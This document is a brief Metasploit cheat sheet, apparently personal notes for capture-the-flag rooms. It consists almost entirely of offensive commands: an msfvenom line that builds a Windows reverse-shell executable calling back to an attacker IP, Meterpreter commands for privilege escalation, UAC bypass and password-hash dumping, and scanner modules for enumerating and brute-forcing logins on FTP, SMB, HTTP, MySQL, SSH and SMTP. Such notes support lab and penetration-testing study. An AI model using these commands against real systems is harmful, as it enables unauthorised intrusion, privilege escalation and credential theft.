
### Basics
```
search x
use x
info
show options, show advanced options
SET X (e.g. set RHOST 10.10.10.10, set payload x)
```_
## Staged Reverse Shell msfVenom payload

Basic Windows Reverse Shell:
``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_Attacker_IP> LPORT=<Your_Port> -f exe > shell.exe
```


### Payloads

Payloads that I have used in rooms
```
cmd/unix/reverse (Check if used exploit is type unix)
```

### Meterpreter

```
background
sessions -l
sessions -i 1
sysinfo, ifconfig, route, getuid
getsystem (privesc)
bypassuac
download x /root/
upload x C:\\Windows
shell
use post/windows/gather/hashdump
```

### Service Enumeration

### FTP
```
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/anonymous
```

### SMB
```
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login

```
### HTTP
```
use auxiliary/scanner/http/apache_userdir_enum
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/robots_txt
```

### MYSQL
```
use auxiliary/admin/mysql/mysql_enum
use auxiliary/admin/mysql/mysql_sql
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_writable_dirs

```
### SSH
```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_enumusers
```

### SMTP
```
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_version
```